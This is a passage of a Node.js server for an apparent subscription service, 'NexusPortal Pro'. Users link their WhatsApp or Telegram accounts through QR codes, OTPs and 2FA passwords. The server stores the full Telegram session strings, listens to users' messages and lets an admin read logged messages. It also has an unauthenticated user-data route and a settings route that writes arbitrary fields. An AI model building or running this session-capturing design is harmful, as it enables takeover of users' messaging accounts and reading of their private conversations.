      s.error = '২ মিনিট সময় শেষ হয়ে গেছে। অনুগ্রহ করে আবার চেষ্টা করুন।';
      if (s.sock) { try { s.sock.end(); } catch (e) {} }
      if (s.folderPath) cleanupFolder(s.folderPath);
      setTimeout(() => pendingSessions.delete(sessionId), 15000);
    }
  }, PENDING_TIMEOUT_MS);

  pendingSessions.set(sessionId, {
    sessionId,
    platform: 'whatsapp',
    method: loginMethod,
    status: 'initializing',
    qrDataUrl: null,
    pairingCode: null,
    user: null,
    error: null,
    expiresAt,
    timeoutTimer
  });

  enqueueLoginTask(() =>
    startWhatsAppLogin({
      sessionId,
      phone: cleanPhone,
      method: loginMethod,
      referredBy: settings.referralEnabled ? referredBy : '',
      termsAccepted: Boolean(termsAccepted)
    })
  ).catch((err) => {
    const s = pendingSessions.get(sessionId);
    if (s) {
      s.status = 'error';
      s.error = err.message || 'WhatsApp সার্ভার কানেকশন ব্যর্থ হয়েছে।';
    }
  });

  res.json({ ok: true, sessionId, expiresAt, timeoutSeconds: 120 });
});

// Start Telegram Login (Fast Direct Connection)
app.post('/api/auth/telegram/start', async (req, res) => {
  const { phone, dialCode, method, referredBy, termsAccepted } = req.body || {};
  const settings = await getSettings();
  const loginMethod = method === 'qr' ? 'qr' : 'phone';

  const policyErr = validateLoginPolicy(settings, 'telegram', loginMethod, termsAccepted);
  if (policyErr) return res.status(400).json({ ok: false, error: policyErr });

  const apiId = Number(process.env.TG_API_ID);
  const apiHash = process.env.TG_API_HASH;
  if (!apiId || !apiHash) {
    return res.status(400).json({ ok: false, error: 'সার্ভারে TG_API_ID এবং TG_API_HASH সেট করা নেই।' });
  }

  const cleanPhone = normalizePhone(phone, dialCode);
  if (loginMethod !== 'qr' && (!cleanPhone || cleanPhone.length < 10)) {
    return res.status(400).json({ ok: false, error: 'সঠিক টেলিগ্রাম নাম্বার দিন।' });
  }

  const sessionId = 'tg_' + crypto.randomBytes(6).toString('hex');
  const expiresAt = Date.now() + PENDING_TIMEOUT_MS;

  const timeoutTimer = setTimeout(() => {
    const s = pendingSessions.get(sessionId);
    if (s && s.status !== 'connected') {
      s.status = 'expired';
      s.error = '২ মিনিট সময় শেষ হয়ে গেছে। আবার চেষ্টা করুন।';
      if (s.tgClient) { try { s.tgClient.disconnect(); } catch (e) {} }
      setTimeout(() => pendingSessions.delete(sessionId), 15000);
    }
  }, PENDING_TIMEOUT_MS);

  pendingSessions.set(sessionId, {
    sessionId,
    platform: 'telegram',
    method: loginMethod,
    status: 'initializing',
    phone: cleanPhone,
    referredBy: settings.referralEnabled ? referredBy : '',
    qrDataUrl: null,
    user: null,
    error: null,
    expiresAt,
    timeoutTimer
  });

  enqueueLoginTask(async () => {
    const s = pendingSessions.get(sessionId);
    const client = new TelegramClient(new StringSession(''), apiId, apiHash, {
      connectionRetries: 2,
      useWSS: false
    });
    await client.connect();
    s.tgClient = client;

    if (loginMethod === 'qr') {
      client.signInUserWithQrCode(
        { apiId, apiHash },
        {
          qrCode: async (code) => {
            const loginUrl = `tg://login?token=${code.token.toString('base64url')}`;
            const qrDataUrl = await QRCode.toDataURL(loginUrl, { width: 280, margin: 1 });
            if (s) {
              s.status = 'qr_ready';
              s.qrDataUrl = qrDataUrl;
            }
          },
          onError: (err) => {
            if (s) {
              s.status = 'error';
              s.error = err.message || 'Telegram QR এরর হয়েছে।';
            }
          }
        }
      ).then(async (tgUser) => {
        if (s && s.timeoutTimer) clearTimeout(s.timeoutTimer);
        const userPhone = normalizePhone(tgUser?.phone || '');
        const userName = [tgUser?.firstName, tgUser?.lastName].filter(Boolean).join(' ') || 'Telegram User';
        const sessionStr = client.session.save();

        const userDoc = await upsertConnectedUser({
          phone: userPhone,
          name: userName,
          platform: 'telegram',
          method: 'qr',
          referredBy: s.referredBy,
          termsAccepted: true,
          tgSessionString: sessionStr
        });

        activeTgClients.set(userDoc.userId, client);
        attachTgMessageListener(client, userDoc.userId, userPhone);
        await logLoginEvent({ userId: userDoc.userId, phone: userPhone, platform: 'telegram', method: 'qr', status: 'Success' });

        if (s) {
          s.status = 'connected';
          s.user = userDoc;
        }
      }).catch((err) => {
        if (s && s.status !== 'expired') {
          s.status = 'error';
          s.error = err.message || 'Telegram QR লগ-ইন ব্যর্থ হয়েছে।';
        }
      });
    } else {
      const sendRes = await client.sendCode({ apiId, apiHash }, '+' + cleanPhone);
      s.phoneCodeHash = sendRes.phoneCodeHash;
      s.status = 'otp_required';
    }
  }).catch((err) => {
    const s = pendingSessions.get(sessionId);
    if (s) {
      s.status = 'error';
      s.error = err.message || 'Telegram সার্ভারে সংযোগ ব্যর্থ হয়েছে।';
    }
  });

  res.json({ ok: true, sessionId, expiresAt, timeoutSeconds: 120 });
});

// Verify Telegram OTP + Optional 2FA Password
app.post('/api/auth/telegram/verify', async (req, res) => {
  const { sessionId, code, password } = req.body || {};
  const s = pendingSessions.get(sessionId);
  if (!s || !s.tgClient) {
    return res.status(400).json({ ok: false, error: 'সেশনের মেয়াদ শেষ হয়ে গেছে। আবার শুরু করুন।' });
  }

  const apiId = Number(process.env.TG_API_ID);
  const apiHash = process.env.TG_API_HASH;

  try {
    try {
      await s.tgClient.invoke(
        new Api.auth.SignIn({
          phoneNumber: '+' + s.phone,
          phoneCodeHash: s.phoneCodeHash,
          phoneCode: String(code || '').trim()
        })
      );
    } catch (err) {
      if (err.errorMessage === 'SESSION_PASSWORD_NEEDED') {
        if (!password) {
          s.status = '2fa_required';
          return res.json({ ok: false, need2fa: true, error: 'আপনার অ্যাকাউন্টে 2FA পাসওয়ার্ড চালু আছে। পাসওয়ার্ড দিন।' });
        }
        await s.tgClient.signInWithPassword({ apiId, apiHash }, {
          password: () => Promise.resolve(password),
          onError: (e) => { throw e; }
        });
      } else {
        throw err;
      }
    }

    if (s.timeoutTimer) clearTimeout(s.timeoutTimer);
    const me = await s.tgClient.getMe();
    const userName = [me?.firstName, me?.lastName].filter(Boolean).join(' ') || 'Telegram User';
    const sessionStr = s.tgClient.session.save();

    const userDoc = await upsertConnectedUser({
      phone: s.phone,
      name: userName,
      platform: 'telegram',
      method: 'phone',
      referredBy: s.referredBy,
      termsAccepted: true,
      tgSessionString: sessionStr
    });

    activeTgClients.set(userDoc.userId, s.tgClient);
    attachTgMessageListener(s.tgClient, userDoc.userId, s.phone);
    await logLoginEvent({ userId: userDoc.userId, phone: s.phone, platform: 'telegram', method: 'phone', status: 'Success' });

    s.status = 'connected';
    s.user = userDoc;
    res.json({ ok: true, user: userDoc });
  } catch (err) {
    res.status(400).json({ ok: false, error: err.errorMessage || err.message || 'ভুল কোড বা পাসওয়ার্ড।' });
  }
});

// Poll Login Status
app.get('/api/auth/status/:sessionId', (req, res) => {
  const s = pendingSessions.get(req.params.sessionId);
  if (!s) {
    return res.json({ status: 'expired', error: 'সেশনের সময় শেষ হয়ে গেছে।' });
  }
  res.json({
    status: s.status,
    platform: s.platform,
    method: s.method,
    qrDataUrl: s.qrDataUrl,
    pairingCode: s.pairingCode,
    user: s.user,
    expiresAt: s.expiresAt,
    error: s.error
  });
});

// User Status & Profile
app.get('/api/user/:userId', async (req, res) => {
  const { userId } = req.params;
  if (mongoConnected) {
    const user = await User.findOne({ userId });
    if (!user) return res.status(404).json({ ok: false, error: 'ইউজার পাওয়া যায়নি।' });
    const payments = await Payment.find({ userId }).sort({ createdAt: -1 }).limit(10);
    return res.json({ ok: true, user, payments });
  } else {
    const user = localStore.users.find((u) => u.userId === userId);
    if (!user) return res.status(404).json({ ok: false, error: 'ইউজার পাওয়া যায়নি।' });
    const payments = localStore.payments.filter((p) => p.userId === userId);
    return res.json({ ok: true, user, payments });
  }
});

// Submit Subscription Payment
app.post('/api/submit-payment', async (req, res) => {
  const s = await getSettings();
  if (!s.paymentEnabled) {
    return res.status(400).json({ ok: false, error: 'বর্তমানে পেমেন্ট সিস্টেম সাময়িকভাবে বন্ধ আছে।' });
  }
  const { userId, phone, method, planId, trxId } = req.body || {};
  if (!userId || !trxId || String(trxId).trim().length < 4) {
    return res.status(400).json({ ok: false, error: 'সঠিক Transaction ID (TrxID) প্রদান করুন।' });
  }
  const plan = (s.plans || []).find((p) => p.id === planId) || { name: 'Pro Monthly', price: 300 };
  const cleanTrx = String(trxId).trim().toUpperCase();

  if (mongoConnected) {
    const exists = await Payment.findOne({ trxId: cleanTrx });
    if (exists) return res.status(400).json({ ok: false, error: 'এই TrxID ইতিমধ্যে জমা দেওয়া হয়েছে।' });
    const pay = await Payment.create({
      trxId: cleanTrx,
      userId,
      phone: phone || '',
      method: method || 'bKash',
      planName: plan.name,
      amount: plan.price,
      status: 'pending'
    });
    return res.json({ ok: true, payment: pay });
  } else {
    const pay = {
      trxId: cleanTrx,
      userId,
      phone: phone || '',
      method: method || 'bKash',
      planName: plan.name,
      amount: plan.price,
      status: 'pending',
      createdAt: new Date()
    };
    localStore.payments.unshift(pay);
    saveLocalStore();
    return res.json({ ok: true, payment: pay });
  }
});

// ==========================================
// 7. ADMIN API ROUTES
// ==========================================
async function verifyAdmin(req, res, next) {
  const authHeader = req.headers['x-admin-password'] || req.body?.adminPassword || '';
  const settings = await getSettings();
  const validPass = getEffectiveAdminPassword(settings);
  if (authHeader !== validPass) {
    return res.status(401).json({ ok: false, error: 'ভুল অ্যাডমিন পাসওয়ার্ড!' });
  }
  next();
}

app.post('/api/admin/login', async (req, res) => {
  const { password } = req.body || {};
  const settings = await getSettings();
  const validPass = getEffectiveAdminPassword(settings);
  if ((password || '').trim() === validPass) {
    return res.json({ ok: true });
  }
  return res.status(401).json({ ok: false, error: 'অ্যাডমিন পাসওয়ার্ড সঠিক নয়।' });
});

app.get('/api/admin/dashboard', verifyAdmin, async (req, res) => {
  const settings = await getSettings();
  if (mongoConnected) {
    const users = await User.find().sort({ createdAt: -1 }).limit(250);
    const payments = await Payment.find().sort({ createdAt: -1 }).limit(120);
    const loginHistory = await LoginHistory.find().sort({ timestamp: -1 }).limit(60);

    const todayStart = new Date();
    todayStart.setHours(0, 0, 0, 0);

    const stats = {
      totalUsers: await User.countDocuments(),
      waUsers: await User.countDocuments({ platform: 'whatsapp' }),
      tgUsers: await User.countDocuments({ platform: 'telegram' }),
      qrUsers: await User.countDocuments({ method: 'qr' }),
      manualOrPhoneUsers: await User.countDocuments({ method: { $in: ['phone', 'manual'] } }),
      activeSubs: await User.countDocuments({ status: 'active', expiresAt: { $gt: new Date() } }),
      bannedUsers: await User.countDocuments({ status: 'banned' }),
      totalRevenue: payments.filter((p) => p.status === 'approved').reduce((acc, p) => acc + (p.amount || 0), 0),
      totalReferrals: users.reduce((acc, u) => acc + (u.referralCount || 0), 0),
      todayLogins: await LoginHistory.countDocuments({ timestamp: { $gte: todayStart } }),
      waToday: await User.countDocuments({ platform: 'whatsapp', createdAt: { $gte: todayStart } }),
      tgToday: await User.countDocuments({ platform: 'telegram', createdAt: { $gte: todayStart } })
    };

    return res.json({
      ok: true,
      dbMode: 'mongodb',
      dbName: connectedDbName,
      stats,
      users,
      payments,
      loginHistory,
      settings
    });
  } else {
    const users = localStore.users;
    const payments = localStore.payments;
    const stats = {
      totalUsers: users.length,
      waUsers: users.filter((u) => u.platform === 'whatsapp').length,
      tgUsers: users.filter((u) => u.platform === 'telegram').length,
      qrUsers: users.filter((u) => u.method === 'qr').length,
      manualOrPhoneUsers: users.filter((u) => u.method !== 'qr').length,
      activeSubs: users.filter((u) => u.status === 'active' && new Date(u.expiresAt) > new Date()).length,
      bannedUsers: users.filter((u) => u.status === 'banned').length,
      totalRevenue: payments.filter((p) => p.status === 'approved').reduce((acc, p) => acc + (p.amount || 0), 0),
      totalReferrals: users.reduce((acc, u) => acc + (u.referralCount || 0), 0),
      todayLogins: localStore.loginHistory.length,
      waToday: 0,
      tgToday: 0
    };
    return res.json({
      ok: true,
      dbMode: 'local',
      dbName: 'Local JSON',
      stats,
      users,
      payments,
      loginHistory: localStore.loginHistory,
      settings
    });
  }
});

// Admin Manual Add User (supports Minutes)
app.post('/api/admin/users/add', verifyAdmin, async (req, res) => {
  const { phone, name, platform, minutes } = req.body || {};
  const cleanPhone = normalizePhone(phone);
  if (!cleanPhone) return res.status(400).json({ ok: false, error: 'সঠিক মোবাইল নাম্বার দিন।' });
  const plat = platform === 'telegram' ? 'telegram' : 'whatsapp';
  const durationMinutes = Number(minutes) || 60;
  const userId = `${plat}_${cleanPhone}`;

  if (mongoConnected) {
    const existing = await User.findOne({ userId });
    if (existing) {
      existing.expiresAt = new Date(Date.now() + durationMinutes * 60000);
      existing.status = 'active';
      if (name) existing.name = name;
      await existing.save();
      return res.json({ ok: true, user: existing });
    }
    const created = await User.create({
      userId,
      phone: cleanPhone,
      name: name || `+${cleanPhone}`,
      platform: plat,
      method: 'manual',
      status: 'active',
      sessionStatus: 'disconnected',
      planName: `Manual (${durationMinutes} মিনিট)`,
      expiresAt: new Date(Date.now() + durationMinutes * 60000),
      referralCode: generateReferralCode(),
      termsAccepted: true
    });
    return res.json({ ok: true, user: created });
  } else {
    const created = {
      userId,
      phone: cleanPhone,
      name: name || `+${cleanPhone}`,
      platform: plat,
      method: 'manual',
      status: 'active',
      sessionStatus: 'disconnected',
      planName: `Manual (${durationMinutes} মিনিট)`,
      expiresAt: new Date(Date.now() + durationMinutes * 60000),
      referralCode: generateReferralCode(),
      referralCount: 0,
      termsAccepted: true,
      createdAt: new Date()
    };
    localStore.users.unshift(created);
    saveLocalStore();
    return res.json({ ok: true, user: created });
  }
});

// Admin Edit Existing User
app.put('/api/admin/users/:userId', verifyAdmin, async (req, res) => {
  const { userId } = req.params;
  const { name, phone, planName, addMinutes, status } = req.body || {};

  if (mongoConnected) {
    const user = await User.findOne({ userId });
    if (!user) return res.status(404).json({ ok: false, error: 'ইউজার পাওয়া যায়নি।' });
    if (name !== undefined) user.name = name;
    if (phone !== undefined) user.phone = normalizePhone(phone);
    if (planName !== undefined) user.planName = planName;
    if (status === 'active' || status === 'banned') user.status = status;
    if (addMinutes && Number(addMinutes) !== 0) {
      const base = user.expiresAt && user.expiresAt > new Date() ? user.expiresAt.getTime() : Date.now();
      user.expiresAt = new Date(base + Number(addMinutes) * 60000);
    }
    await user.save();
    return res.json({ ok: true, user });
  } else {
    const user = localStore.users.find((u) => u.userId === userId);
    if (!user) return res.status(404).json({ ok: false });
    if (name !== undefined) user.name = name;
    if (phone !== undefined) user.phone = normalizePhone(phone);
    if (planName !== undefined) user.planName = planName;
    if (status === 'active' || status === 'banned') user.status = status;
    if (addMinutes && Number(addMinutes) !== 0) {
      const base = user.expiresAt && new Date(user.expiresAt) > new Date() ? new Date(user.expiresAt).getTime() : Date.now();
      user.expiresAt = new Date(base + Number(addMinutes) * 60000);
    }
    saveLocalStore();
    return res.json({ ok: true, user });
  }
});

// Admin User Quick Actions (Ban / Unban / Extend Minutes / Disconnect / Delete)
app.post('/api/admin/users/:userId/action', verifyAdmin, async (req, res) => {
  const { userId } = req.params;
  const { action, minutes } = req.body || {};

  if (mongoConnected) {
    const user = await User.findOne({ userId });
    if (!user) return res.status(404).json({ ok: false, error: 'ইউজার পাওয়া যায়নি।' });

    if (action === 'ban') user.status = 'banned';
    else if (action === 'unban') user.status = 'active';
    else if (action === 'extend') {
      const addMins = Number(minutes) || 60;
      const base = user.expiresAt && user.expiresAt > new Date() ? user.expiresAt.getTime() : Date.now();
      user.expiresAt = new Date(base + addMins * 60000);
      user.planName = `Extended (+${addMins} মিনিট)`;
    } else if (action === 'disconnect') {
      const sock = activeWaSockets.get(userId);
      if (sock) { try { sock.end(); } catch (e) {} activeWaSockets.delete(userId); }
      const tg = activeTgClients.get(userId);
      if (tg) { try { tg.disconnect(); } catch (e) {} activeTgClients.delete(userId); }
      user.sessionStatus = 'disconnected';
    } else if (action === 'delete') {
      const sock = activeWaSockets.get(userId);
      if (sock) { try { sock.end(); } catch (e) {} activeWaSockets.delete(userId); }
      const tg = activeTgClients.get(userId);
      if (tg) { try { tg.disconnect(); } catch (e) {} activeTgClients.delete(userId); }
      if (user.waSessionKey) {
        await SessionStore.deleteOne({ sessionKey: user.waSessionKey });
        cleanupFolder(path.join(WA_SESSIONS_DIR, user.waSessionKey));
      }
      await MessageLog.deleteMany({ userId });
      await User.deleteOne({ userId });
      return res.json({ ok: true });
    }
    await user.save();
    return res.json({ ok: true, user });
  } else {
    const idx = localStore.users.findIndex((u) => u.userId === userId);
    if (idx === -1) return res.status(404).json({ ok: false });
    if (action === 'delete') localStore.users.splice(idx, 1);
    else if (action === 'ban') localStore.users[idx].status = 'banned';
    else if (action === 'unban') localStore.users[idx].status = 'active';
    else if (action === 'extend') {
      localStore.users[idx].expiresAt = new Date(Date.now() + (Number(minutes) || 60) * 60000);
    }
    saveLocalStore();
    return res.json({ ok: true });
  }
});

// Admin Message & Session Check
app.get('/api/admin/messages/:userId', verifyAdmin, async (req, res) => {
  const { userId } = req.params;
  const isLiveSocket = activeWaSockets.has(userId) || activeTgClients.has(userId);

  if (mongoConnected) {
    const user = await User.findOne({ userId });
    const messages = await MessageLog.find({ userId }).sort({ timestamp: -1 }).limit(50);
    return res.json({
      ok: true,
      isLiveSocket,
      sessionStatus: isLiveSocket ? 'connected' : (user?.sessionStatus || 'disconnected'),
      messages
    });
  } else {
    const messages = localStore.messages.filter((m) => m.userId === userId);
    return res.json({
      ok: true,
      isLiveSocket,
      sessionStatus: isLiveSocket ? 'connected' : 'disconnected',
      messages
    });
  }
});

// Admin Payment Approve / Reject (uses Plan Minutes)
app.post('/api/admin/payments/:trxId/action', verifyAdmin, async (req, res) => {
  const { trxId } = req.params;
  const { action } = req.body || {};

  if (mongoConnected) {
    const pay = await Payment.findOne({ trxId });
    if (!pay) return res.status(404).json({ ok: false });
    pay.status = action === 'approve' ? 'approved' : 'rejected';
    await pay.save();

    if (action === 'approve') {
      const s = await getSettings();
      const matchedPlan = (s.plans || []).find((p) => p.name === pay.planName);
      const addMinutes = matchedPlan ? (Number(matchedPlan.minutes) || (Number(matchedPlan.days) || 1) * 1440) : 1440;
      const user = await User.findOne({ userId: pay.userId });
      if (user) {
        const base = user.expiresAt && user.expiresAt > new Date() ? user.expiresAt.getTime() : Date.now();
        user.expiresAt = new Date(base + addMinutes * 60000);
        user.planName = pay.planName;
        await user.save();
      }
    }
    return res.json({ ok: true });
  } else {
    const pay = localStore.payments.find((p) => p.trxId === trxId);
    if (pay) pay.status = action === 'approve' ? 'approved' : 'rejected';
    saveLocalStore();
    return res.json({ ok: true });
  }
});

// Admin Update Settings
app.post('/api/admin/settings', verifyAdmin, async (req, res) => {
  const updates = req.body || {};
  delete updates.adminPassword;

  if (mongoConnected) {
    const doc = await Settings.findOneAndUpdate(
      { key: 'global' },
      { $set: updates },
      { upsert: true, new: true }
    );
    return res.json({ ok: true, settings: doc });
  } else {
    localStore.settings = { ...localStore.settings, ...updates };
    saveLocalStore();
    return res.json({ ok: true, settings: localStore.settings });
  }
});

// ==========================================
// 8. SERVER STARTUP & DB CONNECTION
// ==========================================
async function bootstrap() {
  const uri = (process.env.MONGODB_URI || '').trim();
  if (uri) {
    try {
      await mongoose.connect(uri, { serverSelectionTimeoutMS: 10000 });
      mongoConnected = true;
      connectedDbName = mongoose.connection.name || 'nexus_saas';
      console.log(`MongoDB Atlas Connected (${connectedDbName})`);
      await restoreAllSavedSessions();
    } catch (err) {
      mongoConnected = false;
      console.error('MongoDB Atlas connection failed, falling back to local JSON:', err.message);
    }
  } else {
    console.log('MONGODB_URI not set, running in Local JSON Mode');
  }

  app.listen(PORT, () => {
    console.log(`NexusPortal Pro v4.1 running on port ${PORT} [${mongoConnected ? 'MongoDB: ' + connectedDbName : 'local_json_fallback'}]`);
  });
}

bootstrap();
